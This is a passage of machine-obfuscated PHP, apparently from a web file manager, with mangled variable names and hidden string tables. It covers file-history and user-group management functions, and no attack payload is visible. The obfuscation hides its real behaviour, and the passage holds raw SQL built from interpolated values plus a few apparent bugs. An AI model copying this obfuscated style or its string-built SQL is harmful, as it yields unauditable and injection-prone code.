moveHistory($à©·»ØÔ, $Ù‡äÏ¤¥ = '', $×Ë²±– = '') { $ªœÏ«Üé =& $_SERVER[åÄ¼Ùßš]; $¢œ‹ÁÒñ = self::listData($à©·»ØÔ, !1); if (!$¢œ‹ÁÒñ || !$¢œ‹ÁÒñ[$ªœÏ«Üé[447]]) { return !1; } $‡ÀØòäó = $ªœÏ«Üé[1354]; $Ù‡äÏ¤¥ = $Ù‡äÏ¤¥ ? $Ù‡äÏ¤¥ : get_path_this($à©·»ØÔ); $×Ë²±– = $×Ë²±– ? $×Ë²±– : $¢œ‹ÁÒñ[$ªœÏ«Üé[1366]]; $¢˜‘­İ = substr(get_path_this($¢œ‹ÁÒñ[$ªœÏ«Üé[1367]]), 0, -strlen($‡ÀØòäó)); foreach ($¢œ‹ÁÒñ[$ªœÏ«Üé[447]] as $Œ²ç˜ú  => $ªÕ—¡àë) { $Ê±µ¶ø = $Ù‡äÏ¤¥ . substr($ªÕ—¡àë[$ªœÏ«Üé[32]], strlen($¢˜‘­İ)); $´†¹ÀÀ‚ = IO::move($¢œ‹ÁÒñ[$ªœÏ«Üé[1366]] . $ªÕ—¡àë[$ªœÏ«Üé[32]], $×Ë²±–, !1, $Ê±µ¶ø); if ($´†¹ÀÀ‚) { $¢œ‹ÁÒñ[$ªœÏ«Üé[447]][$Œ²ç˜ú ][$ªœÏ«Üé[32]] = $Ê±µ¶ø; } } $¢œ‹ÁÒñ[$ªœÏ«Üé[1367]] = IO::move($¢œ‹ÁÒñ[$ªœÏ«Üé[1367]], $×Ë²±–, !1, $Ù‡äÏ¤¥ . $‡ÀØòäó); self::saveData($¢œ‹ÁÒñ[$ªœÏ«Üé[1367]], $¢œ‹ÁÒñ[$ªœÏ«Üé[447]]); self::clearEmptyFolder($¢œ‹ÁÒñ[$ªœÏ«Üé[1366]]); } public static function rollback($şĞ¿ñ¼ã, $Ü»‰Êí) { $ôŞÅ”é¹ =& $_SERVER[åÄ¼Ùßš]; $ã—‰ìºİ = self::listData($şĞ¿ñ¼ã); if (!$ã—‰ìºİ) { return; } $¦û‘£œÆ = IO::info($şĞ¿ñ¼ã); foreach ($ã—‰ìºİ[$ôŞÅ”é¹[447]] as $ıÕô§ => $Œ–ò¬Ş) { if ($Œ–ò¬Ş[$ôŞÅ”é¹[484]] == $Ü»‰Êí) { self::add($şĞ¿ñ¼ã); $‹¸†•Ìå = $ã—‰ìºİ[$ôŞÅ”é¹[1366]] . $Œ–ò¬Ş[$ôŞÅ”é¹[32]]; $ëü¿È“¸ = IO::copy($‹¸†•Ìå, IO::pathFather($şĞ¿ñ¼ã), REPEAT_REPLACE, $¦û‘£œÆ[$ôŞÅ”é¹[32]]); if ($ëü¿È“¸) { self::remove($şĞ¿ñ¼ã, $Ü»‰Êí); } return $ëü¿È“¸; } } return !1; } public static function setDetail($ÏÊæ´ş, $î‚û‰¢‚, $Öé£¯¨½) { $å´Èõ =& $_SERVER[åÄ¼Ùßš]; $”×•’ó = self::listData($ÏÊæ´ş); if (!$”×•’ó) { return; } foreach ($”×•’ó[$å´Èõ[447]] as $Ü‰öÄö¼ => $À´âèòƒ) { if ($À´âèòƒ[$å´Èõ[484]] == $î‚û‰¢‚) { $”×•’ó[$å´Èõ[447]][$Ü‰öÄö¼][$å´Èõ[1365]] = $Öé£¯¨½; self::saveData($”×•’ó[$å´Èõ[1367]], $”×•’ó[$å´Èõ[447]]); return !0; } } return !1; } public static function fileInfo($è ×²Îø, $˜«êıíÇ) { $ş¦İêè¦ =& $_SERVER[åÄ¼Ùßš]; $“—’½°¼ = self::listData($è ×²Îø); if (!$“—’½°¼) { show_json(LNG($ş¦İêè¦[108]), !1); } $ÈáøÙÌª = $ş¦İêè¦[12]; foreach ($“—’½°¼[$ş¦İêè¦[447]] as $¹×ÁÍ—¢ => $œĞÚ½È) { if ($œĞÚ½È[$ş¦İêè¦[484]] != $˜«êıíÇ) { continue; } $ÈáøÙÌª = $“—’½°¼[$ş¦İêè¦[1366]] . $œĞÚ½È[$ş¦İêè¦[32]]; break; } if (!$ÈáøÙÌª) { show_json(LNG($ş¦İêè¦[108]), !1); } return IO::info($ÈáøÙÌª); } public static function fileOut($Ô–óÚÉ–, $Â˜şª½, $ÚêØİ£á = false) { $¶ ˜Ú¬‰ =& $_SERVER[åÄ¼Ùßš]; $Ğ“Ù–¦Ô = self::fileInfo($Ô–óÚÉ–, $Â˜şª½); $²¾Ô‚¸Ñ =& $GLOBALS[$¶ ˜Ú¬‰[7]]; $ÚêØİ£á = isset($²¾Ô‚¸Ñ[$¶ ˜Ú¬‰[1317]]) && $²¾Ô‚¸Ñ[$¶ ˜Ú¬‰[1317]] == 1; if (isset($²¾Ô‚¸Ñ[$¶ ˜Ú¬‰[33]]) && $²¾Ô‚¸Ñ[$¶ ˜Ú¬‰[33]] == $¶ ˜Ú¬‰[1368]) { return IO::fileOutImage($Ğ“Ù–¦Ô[$¶ ˜Ú¬‰[87]], $²¾Ô‚¸Ñ[$¶ ˜Ú¬‰[1369]]); } IO::fileOut($Ğ“Ù–¦Ô[$¶ ˜Ú¬‰[87]], $ÚêØİ£á, get_path_this($Ô–óÚÉ–)); } public static function listData($ó‘ÛëÆ«, $É˜Ï¸Í = true) { $¡ê•ŠªÓ =& $_SERVER[åÄ¼Ùßš]; if ($É˜Ï¸Í && !IO::exist($ó‘ÛëÆ«)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ó‘ÛëÆ«, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ê¬İà´š = self::pathHistory($ó‘ÛëÆ«); $–«ß†… = array($¡ê•ŠªÓ[1367] => $ê¬İà´š . $¡ê•ŠªÓ[1354], $¡ê•ŠªÓ[1366] => rtrim(get_path_father($ê¬İà´š), $¡ê•ŠªÓ[8]) . $¡ê•ŠªÓ[8], $¡ê•ŠªÓ[447] => array()); $ˆ­ÀÊ¼á = IO::getContent($–«ß†…[$¡ê•ŠªÓ[1367]]); if ($ˆ­ÀÊ¼á) { $ğı•€åƒ = json_decode($ˆ­ÀÊ¼á, !0); if (is_array($ğı•€åƒ)) { $–«ß†…[$¡ê•ŠªÓ[447]] = $ğı•€åƒ; } } return $–«ß†…; } private static function saveData($ùŒ×â©Š, $¬†Šíá©) { $àÂìÂ«¿ =& $_SERVER[åÄ¼Ùßš]; self::log($àÂìÂ«¿[1370] . $ùŒ×â©Š . $àÂìÂ«¿[74] . count($¬†Šíá©), $àÂìÂ«¿[845]); if ($¬†Šíá©) { return IO::setContent($ùŒ×â©Š, json_encode($¬†Šíá©)); } $òí‡¬Æ¢ = IO::pathFather($ùŒ×â©Š); IO::remove($ùŒ×â©Š); self::clearEmptyFolder($òí‡¬Æ¢); return !0; } public static function clearEmptyFolder($ÒÓŒ—ƒÎ) { $Ó÷úÌİ´ =& $_SERVER[åÄ¼Ùßš]; if (trim($ÒÓŒ—ƒÎ, $Ó÷úÌİ´[8]) == trim(self::$_historyBase, $Ó÷úÌİ´[8])) { return; } $ãóÀÒ‡´ = IO::pathFather($ÒÓŒ—ƒÎ); $®ÖÈìÒ = IO::has($ÒÓŒ—ƒÎ, !0); if ($®ÖÈìÒ[$Ó÷úÌİ´[242]] > 0 || $®ÖÈìÒ[$Ó÷úÌİ´[243]] > 0) { return; } IO::remove($ÒÓŒ—ƒÎ); self::clearEmptyFolder($ãóÀÒ‡´); } private static function getBasePath() { $Ì²­–Š• =& $_SERVER[åÄ¼Ùßš]; $õ’õîÀ = Model($Ì²­–Š•[1371])->get($Ì²­–Š•[1372]); if ($õ’õîÀ) { if (!IO::exist($õ’õîÀ)) { IO::mkdir($õ’õîÀ); } if (get_path_this($õ’õîÀ) == $Ì²­–Š•[1357]) { $ ‹àçêÎ = $Ì²­–Š•[1373] . rand_string(8); @rename($õ’õîÀ, get_path_father($õ’õîÀ) . $Ì²­–Š•[8] . $ ‹àçêÎ); $õ’õîÀ = DATA_PATH . $ ‹àçêÎ . $Ì²­–Š•[8]; file_put_contents(DATA_PATH . $Ì²­–Š•[1304], $Ì²­–Š•[12]); Model($Ì²­–Š•[1371])->set($Ì²­–Š•[1372], $õ’õîÀ); } return $õ’õîÀ; } $õ’õîÀ = DATA_PATH . $Ì²­–Š•[1373] . rand_string(8) . $Ì²­–Š•[8]; $õ’õîÀ = IO::mkdir($õ’õîÀ); $õ’õîÀ = rtrim($õ’õîÀ, $Ì²­–Š•[8]) . $Ì²­–Š•[8]; file_put_contents($õ’õîÀ . $Ì²­–Š•[1304], $Ì²­–Š•[12]); file_put_contents(DATA_PATH . $Ì²­–Š•[1304], $Ì²­–Š•[12]); Model($Ì²­–Š•[1371])->set($Ì²­–Š•[1372], $õ’õîÀ); return $õ’õîÀ; } } goto f„¼İ‹•Ö; dÖÇÓ—°Ê: class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\160"; protected $tableMeta = array("\164\141\142\154\x65\x4e\x61\155\145" => "\147\x72\x6f\x75\160\x5f\x6d\145\164\x61", "\x6d\x65\x74\x61\106\x69\x65\x6c\144" => "\147\x72\x6f\165\x70\x49\x44"); protected function cacheFunctionAlias($üñ¹¯¼Ò) { $å¤ïïœ =& $_SERVER[åÄ¼Ùßš]; return array($å¤ïïœ[2098] => array($üñ¹¯¼Ò[0], $å¤ïïœ[2099]), $å¤ïïœ[2100] => array($üñ¹¯¼Ò[0], $å¤ïïœ[2101])); } protected function getInfo($ÛÇäĞ‚Ó, $ÅÕÛÉ¨ = false) { $»¿¯óÂ = $this->getInfoSimple($ÛÇäĞ‚Ó); if (!$»¿¯óÂ) { return !1; } if ($ÅÕÛÉ¨) { return $this->_listDataApplyItem($»¿¯óÂ); } return $this->cacheFunctionGet($_SERVER[åÄ¼Ùßš][2102], $ÛÇäĞ‚Ó); } protected function getInfoSimple($ÔùƒÃÁ, $óğ´åµ‹ = false) { $Ä´ş£Š‡ =& $_SERVER[åÄ¼Ùßš]; if ($óğ´åµ‹) { $¡¨â“Ë = array($Ä´ş£Š‡[1428] => intval($ÔùƒÃÁ)); $†£¤òàğ = $this->where($¡¨â“Ë)->find(); return is_array($†£¤òàğ) ? $†£¤òàğ : array(); } return $this->cacheFunctionGet($Ä´ş£Š‡[2103], $ÔùƒÃÁ); } protected function groupAdd($ ²€¯İ) { $™“‘âÄ÷ =& $_SERVER[åÄ¼Ùßš]; if (!$ ²€¯İ[$™“‘âÄ÷[193]] && isset($ ²€¯İ[$™“‘âÄ÷[1428]]) && $ ²€¯İ[$™“‘âÄ÷[1428]] == 1) { if ($ï¶¹ˆé = $this->getInfoSimple($ ²€¯İ[$™“‘âÄ÷[1428]], !0)) { return $ ²€¯İ[$™“‘âÄ÷[1428]]; } } else { $ï¶¹ˆé = $this->getInfoSimple($ ²€¯İ[$™“‘âÄ÷[193]]); if (!$ï¶¹ˆé) { return !1; } } $ÈÑŒ´ÜØ = $™“‘âÄ÷[606]; if ($ï¶¹ˆé[$™“‘âÄ÷[597]]) { $ÈÑŒ´ÜØ = $ï¶¹ˆé[$™“‘âÄ÷[597]] . $ï¶¹ˆé[$™“‘âÄ÷[1428]] . $™“‘âÄ÷[50]; } $şÓ¨ôÛš = array($™“‘âÄ÷[506] => $this->groupNameAuto($ ²€¯İ[$™“‘âÄ÷[193]], $ ²€¯İ[$™“‘âÄ÷[32]]), $™“‘âÄ÷[489] => $ ²€¯İ[$™“‘âÄ÷[193]], $™“‘âÄ÷[668] => $ÈÑŒ´ÜØ, $™“‘âÄ÷[2104] => $ ²€¯İ[$™“‘âÄ÷[2004]], $™“‘âÄ÷[2105] => 0, $™“‘âÄ÷[2021] => 0); $ ²€¯İ[$™“‘âÄ÷[32]] = $şÓ¨ôÛš[$™“‘âÄ÷[32]]; if (isset($ ²€¯İ[$™“‘âÄ÷[2041]])) { $şÓ¨ôÛš[$™“‘âÄ÷[2041]] = $ ²€¯İ[$™“‘âÄ÷[2041]]; } else { $¬Ÿà×»ô = $this->max($™“‘âÄ÷[2041]); if (!$¬Ÿà×»ô) { $¬Ÿà×»ô = 0; } $şÓ¨ôÛš[$™“‘âÄ÷[2041]] = $¬Ÿà×»ô + 1; } if (!empty($ ²€¯İ[$™“‘âÄ÷[1428]])) { $şÓ¨ôÛš[$™“‘âÄ÷[1428]] = $ ²€¯İ[$™“‘âÄ÷[1428]]; } $ªá«êûˆ = $this->add($şÓ¨ôÛš); $this->groupMetaEdit($ªá«êûˆ, $ ²€¯İ); Model($™“‘âÄ÷[1466])->groupRootAdd($ªá«êûˆ); $this->_clearCache($ ²€¯İ[$™“‘âÄ÷[193]]); return $ªá«êûˆ; } protected function groupEdit($×”ü®ê, $Ú÷ğ×äŞ) { $Ş·Ó¯›ı =& $_SERVER[åÄ¼Ùßš]; $ÛÈ¢ÅÕš = $this->getInfoSimple($×”ü®ê); if (!$ÛÈ¢ÅÕš) { return !1; } if (!empty($Ú÷ğ×äŞ[$Ş·Ó¯›ı[193]])) { $§ıÎÎâ = $this->getInfoSimple($Ú÷ğ×äŞ[$Ş·Ó¯›ı[193]]); if (!$§ıÎÎâ) { return !1; } if ($ÛÈ¢ÅÕš[$Ş·Ó¯›ı[1428]] == $§ıÎÎâ[$Ş·Ó¯›ı[1428]]) { return !1; } if ($Ú÷ğ×äŞ[$Ş·Ó¯›ı[193]] != $ÛÈ¢ÅÕš[$Ş·Ó¯›ı[193]]) { if ($§ıÎÎâ[$Ş·Ó¯›ı[597]] !== $ÛÈ¢ÅÕš[$Ş·Ó¯›ı[597]] && strpos($§ıÎÎâ[$Ş·Ó¯›ı[597]], $ÛÈ¢ÅÕš[$Ş·Ó¯›ı[597]] . $ÛÈ¢ÅÕš[$Ş·Ó¯›ı[1428]] . $Ş·Ó¯›ı[50]) === 0) { return !1; } $Ú÷ğ×äŞ[$Ş·Ó¯›ı[668]] = $§ıÎÎâ[$Ş·Ó¯›ı[597]] . $Ú÷ğ×äŞ[$Ş·Ó¯›ı[193]] . $Ş·Ó¯›ı[50]; $this->_changeChildLevel($ÛÈ¢ÅÕš, $§ıÎÎâ); $this->_clearCache($§ıÎÎâ[$Ş·Ó¯›ı[1428]]); $this->_clearCache($ÛÈ¢ÅÕš[$Ş·Ó¯›ı[193]]); } } $this->groupMetaEdit($×”ü®ê, $Ú÷ğ×äŞ); $this->_clearChildrenCache($ÛÈ¢ÅÕš); return $this->where(array($Ş·Ó¯›ı[2106] => $×”ü®ê))->save($Ú÷ğ×äŞ); } private function groupMetaEdit($Î“´ìÊ–, &$¦ÉÜÕÒ¿) { $ÍŠ»¼ù =& $_SERVER[åÄ¼Ùßš]; if (isset($¦ÉÜÕÒ¿[$ÍŠ»¼ù[32]])) { $this->setNamePinyin($Î“´ìÊ–, $¦ÉÜÕÒ¿[$ÍŠ»¼ù[32]]); } if (isset($¦ÉÜÕÒ¿[$ÍŠ»¼ù[2107]])) { $á¬È×Èñ = array($ÍŠ»¼ù[2107] => $¦ÉÜÕÒ¿[$ÍŠ»¼ù[2107]], $ÍŠ»¼ù[2108] => $¦ÉÜÕÒ¿[$ÍŠ»¼ù[2108]]); unset($¦ÉÜÕÒ¿[$ÍŠ»¼ù[2107]]); unset($¦ÉÜÕÒ¿[$ÍŠ»¼ù[2108]]); if (isset($¦ÉÜÕÒ¿[$ÍŠ»¼ù[2109]])) { $üÄÅ„ıì = $ÍŠ»¼ù[1424] . $Î“´ìÊ–; $ßİæúüÕ = $ÍŠ»¼ù[1423]; $¥ù””» = $¦ÉÜÕÒ¿[$ÍŠ»¼ù[2109]] ? $¦ÉÜÕÒ¿[$ÍŠ»¼ù[2109]] : $ÍŠ»¼ù[12]; $óÇ®‰Ä¡ = Model($ÍŠ»¼ù[1422])->get($üÄÅ„ıì, $ßİæúüÕ); $óÇ®‰Ä¡ = $óÇ®‰Ä¡ ? $óÇ®‰Ä¡ : $ÍŠ»¼ù[12]; if ($óÇ®‰Ä¡ != $¥ù””») { if (!$¥ù””» && $óÇ®‰Ä¡) { Model($ÍŠ»¼ù[1422])->remove($üÄÅ„ıì, $ßİæúüÕ); } else { if ($¥ù””») { Model($ÍŠ»¼ù[1422])->set($üÄÅ„ıì, $¥ù””», $ßİæúüÕ); } } } $á¬È×Èñ[$ÍŠ»¼ù[2109]] = $¥ù””»; } $this->metaSet($Î“´ìÊ–, $á¬È×Èñ); } } private function _clearChildrenCache($‰õ”şş†) { $í¬Œ¿»³ =& $_SERVER[åÄ¼Ùßš]; $ıÅØ˜¡ = array($í¬Œ¿»³[668] => array($í¬Œ¿»³[628], $‰õ”şş†[$í¬Œ¿»³[597]] . $‰õ”şş†[$í¬Œ¿»³[1428]] . $í¬Œ¿»³[629])); $ƒ·¨›ä = $this->field($í¬Œ¿»³[1428])->where($ıÅØ˜¡)->select(); foreach ($ƒ·¨›ä as $ï¬í˜–ğ) { $this->_clearCache($ï¬í˜–ğ[$í¬Œ¿»³[1428]]); } } private function _clearCache($Ğè¶ïË¬) { $ãç„¹ş =& $_SERVER[åÄ¼Ùßš]; $this->cacheFunctionClear($ãç„¹ş[2102], $Ğè¶ïË¬); $this->cacheFunctionClear($ãç„¹ş[2103], $Ğè¶ïË¬); } private function _changeChildLevel($ û×Ø°÷, $Şãõ¶‰Œ, $èªãéğ‘ = false) { $ÌÉ‚ë¯† =& $_SERVER[åÄ¼Ùßš]; $·êÀş… = $ û×Ø°÷[$ÌÉ‚ë¯†[597]] . $ û×Ø°÷[$ÌÉ‚ë¯†[1428]] . $ÌÉ‚ë¯†[50]; $¢ˆ¥ÈÅ¬ = $Şãõ¶‰Œ[$ÌÉ‚ë¯†[597]] . $Şãõ¶‰Œ[$ÌÉ‚ë¯†[1428]] . $ÌÉ‚ë¯†[50] . $ û×Ø°÷[$ÌÉ‚ë¯†[1428]] . $ÌÉ‚ë¯†[50]; if ($èªãéğ‘) { $¢ˆ¥ÈÅ¬ = $Şãõ¶‰Œ[$ÌÉ‚ë¯†[597]] . $Şãõ¶‰Œ[$ÌÉ‚ë¯†[1428]] . $ÌÉ‚ë¯†[50]; } $ÈíúÏ = array($ÌÉ‚ë¯†[668] => array($ÌÉ‚ë¯†[628], $ û×Ø°÷[$ÌÉ‚ë¯†[597]] . $ û×Ø°÷[$ÌÉ‚ë¯†[1428]] . $ÌÉ‚ë¯†[629])); $çŠ€ÛÀù = array($ÌÉ‚ë¯†[668] => array($ÌÉ‚ë¯†[677], "\162\145\x70\x6c\x61\143\145\x28\160\141\162\x65\x6e\x74\114\145\166\145\x6c\x2c\x27{$·êÀş…}\x27\54\x27{$¢ˆ¥ÈÅ¬}\x27\51")); $this->_clearChildrenCache($ û×Ø°÷); $this->where($ÈíúÏ)->data($çŠ€ÛÀù)->save(); } public function setNamePinyin($‹†Éèİã, $ˆº´ËÛ = false) { $Ë­¤ÜÉ =& $_SERVER[åÄ¼Ùßš]; if (!$ˆº´ËÛ) { $Ä¢Ã² = $this->getInfoSimple($‹†Éèİã); $ˆº´ËÛ = $Ä¢Ã²[$Ë­¤ÜÉ[32]]; } if (!Input::check($ˆº´ËÛ, $Ë­¤ÜÉ[671])) { $this->metaSet($‹†Éèİã, $Ë­¤ÜÉ[549], null); $this->metaSet($‹†Éèİã, $Ë­¤ÜÉ[548], null); return; } $õƒ¦‘Çş = array($Ë­¤ÜÉ[549] => str_replace($Ë­¤ÜÉ[53], $Ë­¤ÜÉ[12], Pinyin::get($ˆº´ËÛ)), $Ë­¤ÜÉ[548] => Pinyin::get($ˆº´ËÛ, $Ë­¤ÜÉ[672])); $this->metaSet($‹†Éèİã, $õƒ¦‘Çş); } protected function metaSet($Ûº€ùíš, $ó…³Â¹Š = null, $¶ˆ“üÜ— = null) { $this->_clearCache($Ûº€ùíš); return parent::metaSet($Ûº€ùíš, $ó…³Â¹Š, $¶ˆ“üÜ—); } protected function groupStatus($Áñˆãöô, $ıµ«°) { $…‰¶íÈÓ =& $_SERVER[åÄ¼Ùßš]; $š«´€Ñ = $this->getInfoSimple($Áñˆãöô); if (!$š«´€Ñ) { return !1; } $this->_clearCache($Áñˆãöô); return $this->metaSet($Áñˆãöô, $…‰¶íÈÓ[843], $ıµ«°); if ($ıµ«° == $…‰¶íÈÓ[91]) { $Á®Õ Ô§ = $this->parentLevelArray($š«´€Ñ[$…‰¶íÈÓ[597]]); } else { } $Á®Õ Ô§[] = $š«´€Ñ[$…‰¶íÈÓ[1428]]; $é©íÔÖ = array(); foreach ($Á®Õ Ô§ as $Áñˆãöô) { $é©íÔÖ[] = array($…‰¶íÈÓ[1428] => $Áñˆãöô, $…‰¶íÈÓ[97] => $…‰¶íÈÓ[843], $…‰¶íÈÓ[452] => $ıµ«°); $this->_clearCache($Áñˆãöô); } return Model($…‰¶íÈÓ[2110])->addAll($é©íÔÖ, array(), !0); } protected function groupRemove($ÂöŸÕƒÀ, $îâÍï„ = false) { $¶É‚Ü¾ı =& $_SERVER[åÄ¼Ùßš]; $ÌëñöôÎ = array($¶É‚Ü¾ı[1428] => $ÂöŸÕƒÀ); $Â‚ÉòĞŒ = $this->where($ÌëñöôÎ)->find(); if (!$Â‚ÉòĞŒ || $Â‚ÉòĞŒ[$¶É‚Ü¾ı[193]] == 0) { return !1; } if (!$îâÍï„) { $µÖà”Û = $this->getInfoSimple($Â‚ÉòĞŒ[$¶É‚Ü¾ı[193]]); $this->_changeChildLevel($Â‚ÉòĞŒ, $µÖà”Û, !0); $this->where(array($¶É‚Ü¾ı[193] => $ÂöŸÕƒÀ))->save(array($¶É‚Ü¾ı[193] => $Â‚ÉòĞŒ[$¶É‚Ü¾ı[193]])); $this->_clearCache($µÖà”Û[$¶É‚Ü¾ı[1428]]); } Model($¶É‚Ü¾ı[2110])->where($ÌëñöôÎ)->delete(); Model($¶É‚Ü¾ı[2111])->where($ÌëñöôÎ)->delete(); Model($¶É‚Ü¾ı[926])->groupRootRemove($ÂöŸÕƒÀ); $this->_clearCache($Â‚ÉòĞŒ[$¶É‚Ü¾ı[193]]); return $this->where($ÌëñöôÎ)->delete(); } protected function groupSort($İèÑ´‚…) { $ÊŠÄ¿Ğä =& $_SERVER[åÄ¼Ùßš]; $š±‰°ç‹ = array(); foreach ($İèÑ´‚… as $¢ùªö => $ĞŠ¶®øù) { $š±‰°ç‹[] = array($ÊŠÄ¿Ğä[1428], $ĞŠ¶®øù, $ÊŠÄ¿Ğä[2041], $¢ùªö + 1); } $this->saveAll($š±‰°ç‹); } public function listData() { $©ùí¦Ç = $this->_makeOrder()->selectPage(50); $this->_listDataApply($©ùí¦Ç[$_SERVER[åÄ¼Ùßš][447]]); return $©ùí¦Ç; } private function _makeOrder($çöÌëñ› = '') { $ßâ¦Áƒ¯ =& $_SERVER[åÄ¼Ùßš]; $Ù™û‰–Ğ = array($ßâ¦Áƒ¯[1428], $ßâ¦Áƒ¯[32], $ßâ¦Áƒ¯[2006], $ßâ¦Áƒ¯[234]); $‘æÌ›Ìï = array($ßâ¦Áƒ¯[534] => $ßâ¦Áƒ¯[535], $ßâ¦Áƒ¯[536] => $ßâ¦Áƒ¯[537]); $˜¹ï†ƒì = Input::get($ßâ¦Áƒ¯[541], $ßâ¦Áƒ¯[7], $ßâ¦Áƒ¯[2021], $Ù™û‰–Ğ); $šé•©åœ = Input::get($ßâ¦Áƒ¯[542], $ßâ¦Áƒ¯[7], $ßâ¦Áƒ¯[2112], array($ßâ¦Áƒ¯[2112], $ßâ¦Áƒ¯[536])); $šé•©åœ = $‘æÌ›Ìï[$šé•©åœ]; $çöÌëñ› = $çöÌëñ› . "{$˜¹ï†ƒì}\x20{$šé•©åœ}\54\x20\147\x72\157\x75\x70\x49\x44\x20\x61\163\143"; return $this->order($çöÌëñ›); } public function listChild($¹‰€øù”) { $ü¬³ ¤ =& $_SERVER[åÄ¼Ùßš]; $³Ãüßµı = $this->where(array($ü¬³ ¤[193] => $¹‰€øù”))->_makeOrder()->selectPage(200); $this->_listDataApply($³Ãüßµı[$ü¬³ ¤[447]]); return $³Ãüßµı; } public function listChildIds($çÚË‘õ¬) { $’ØØÁ° =& $_SERVER[åÄ¼Ùßš]; if (is_string($„ıäˆ”©)) { $çÚË‘õ¬ = explode($’ØØÁ°[50], $çÚË‘õ¬); } $ñŞ½òÜÆ = $this->where(array($’ØØÁ°[1428] => array($’ØØÁ°[7], $çÚË‘õ¬)))->field($’ØØÁ°[2113])->select(); if (!$ñŞ½òÜÆ) { return !1; } $ÒÄÉ´ú = array(); foreach ($ñŞ½òÜÆ as $Óø¯´…) { $ÒÄÉ´ú[] = "\x73\x65\154\145\143\x74\40\147\x72\x6f\x75\x70\x49\x44\40\x66\162\157\x6d\x20\x60\147\x72\x6f\165\x70\140\x20\167\150\x65\x72\x65\x20\160\141\162\x65\156\x74\114\x65\x76\145\154\40\x6c\151\x6b\145\x20\x27{$Óø¯´…[$’ØØÁ°[597]]}{$Óø¯´…[$’ØØÁ°[1428]]}\54\x25\x27"; } $ÒÄÉ´ú = implode($’ØØÁ°[2114], $ÒÄÉ´ú); $ñŞ½òÜÆ = $this->query($ÒÄÉ´ú); if (!$ñŞ½òÜÆ) { return array(); } $çÚË‘õ¬ = array_to_keyvalue($ñŞ½òÜÆ, $’ØØÁ°[12], $’ØØÁ°[1428]); return array_unique($çÚË‘õ¬); } public function listByID($øô®şÃã) { $çõüæÖÓ =& $_SERVER[åÄ¼Ùßš]; if (!$øô®şÃã) { return array(); } $ñŞ¢›¡â = array($çõüæÖÓ[1428] => array($çõüæÖÓ[7], $øô®şÃã)); $ÇÏéÉ = $this->where($ñŞ¢›¡â)->select(); $ÇÏéÉ = array_sort_keep($ÇÏéÉ, $çõüæÖÓ[1428], $øô®şÃã); $this->_listDataApply($ÇÏéÉ); return $ÇÏéÉ; } public function listSearch($°§İ›™à) { $ş©Æ–úŞ =& $_SERVER[åÄ¼Ùßš]; $™÷ÈÚñ = trim($°§İ›™à[$ş©Æ–úŞ[2115]]); $–û˜íÏ = explode($ş©Æ–úŞ[53], $™÷ÈÚñ); if (!$™÷ÈÚñ || count($–û˜íÏ) == 1) { return $this->listSearchNow($°§İ›™à); } $ÈÚ“¼“» = array($ş©Æ–úŞ[447] => array()); foreach ($–û˜íÏ as $¼ìı„§) { if (!trim($¼ìı„§)) { continue; } $°§İ›™à[$ş©Æ–úŞ[2115]] = $¼ìı„§; $ÚÍôÎÚÑ = $this->listSearchNow($°§İ›™à); $ÈÚ“¼“»[$ş©Æ–úŞ[447]] = array_merge($ÈÚ“¼“»[$ş©Æ–úŞ[447]], $ÚÍôÎÚÑ[$ş©Æ–úŞ[447]]); } $ÈÚ“¼“»[$ş©Æ–úŞ[447]] = array_unique_by_key($ÈÚ“¼“»[$ş©Æ–úŞ[447]], $ş©Æ–úŞ[1428]); $ÈÚ“¼“»[$ş©Æ–úŞ[444]] = array($ş©Æ–úŞ[445] => count($ÈÚ“¼“»[$ş©Æ–úŞ[447]]), $ş©Æ–úŞ[441] => 20, $ş©Æ–úŞ[430] => 1, $ş©Æ–úŞ[446] => 1); return $ÈÚ“¼“»; } public function listSearchNow($êËÂæÊî) { $ñ¡··ìí =& $_SERVER[åÄ¼Ùßš]; $ƒôé²ºˆ = trim($êËÂæÊî[$ñ¡··ìí[2115]]); $ÁÃ¹¤Ï = isset($êËÂæÊî[$ñ¡··ìí[2116]]) ? $êËÂæÊî[$ñ¡··ìí[2116]] : !1; if (!trim($ƒôé²ºˆ)) { return !1; } $ƒôé²ºˆ = str_replace($ñ¡··ìí[2117], $ñ¡··ìí[2118], $ƒôé²ºˆ); $¿éøŒÖ‹ = array($ñ¡··ìí[1428] => array($ñ¡··ìí[471], "{$ƒôé²ºˆ}\x25"), $ñ¡··ìí[32] => array($ñ¡··ìí[471], "\45{$ƒôé²ºˆ}\x25"), $ñ¡··ìí[1108] => $ñ¡··ìí[2119]); if ($ÁÃ¹¤Ï) { $³†ĞàŒ˜ = $this->getInfoSimple($ÁÃ¹¤Ï); $Â®âˆû’ = $³†ĞàŒ˜[$ñ¡··ìí[597]] . $ÁÃ¹¤Ï . $ñ¡··ìí[629]; $¿éøŒÖ‹ = array($¿éøŒÖ‹, array($ñ¡··ìí[597] => array($ñ¡··ìí[471], $Â®âˆû’))); } $¿éøŒÖ‹ = $this->parseWhereLike($¿éøŒÖ‹); $Û¿’ƒÆ = $this->_makeOrder()->where($¿éøŒÖ‹)->selectPage(20); $Û¿’ƒÆ = $Û¿’ƒÆ ? $Û¿’ƒÆ : array($ñ¡··ìí[447] => array(), $ñ¡··ìí[444] => array()); if (!$Û¿’ƒÆ || count($Û¿’ƒÆ[$ñ¡··ìí[447]]) < 5 && Input::check($ƒôé²ºˆ, $ñ¡··ìí[395])) { $´×§¿ó = $this->groupChildrenAll($ÁÃ¹¤Ï); $†¡§œşÜ = $this->_searchFromMeta($ñ¡··ìí[548], $ƒôé²ºˆ, 10, $´×§¿ó); $ù…Òı²ø = $this->_searchFromMeta($ñ¡··ìí[549], $ƒôé²ºˆ, 10, $´×§¿ó); $ÕµÆíŒ² = array_merge($†¡§œşÜ, $ù…Òı²ø, $Û¿’ƒÆ[$ñ¡··ìí[447]]); $Û¿’ƒÆ[$ñ¡··ìí[447]] = array_unique_by_key($ÕµÆíŒ², $ñ¡··ìí[1428]); $Û¿’ƒÆ[$ñ¡··ìí[444]][$ñ¡··ìí[445]] = count($Û¿’ƒÆ[$ñ¡··ìí[447]]); $Û¿’ƒÆ[$ñ¡··ìí[444]][$ñ¡··ìí[446]] = ceil($Û¿’ƒÆ[$ñ¡··ìí[444]][$ñ¡··ìí[445]] / $Û¿’ƒÆ[$ñ¡··ìí[444]][$ñ¡··ìí[441]]); } $this->_listDataApply($Û¿’ƒÆ[$ñ¡··ìí[447]]); return $Û¿’ƒÆ; } protected function 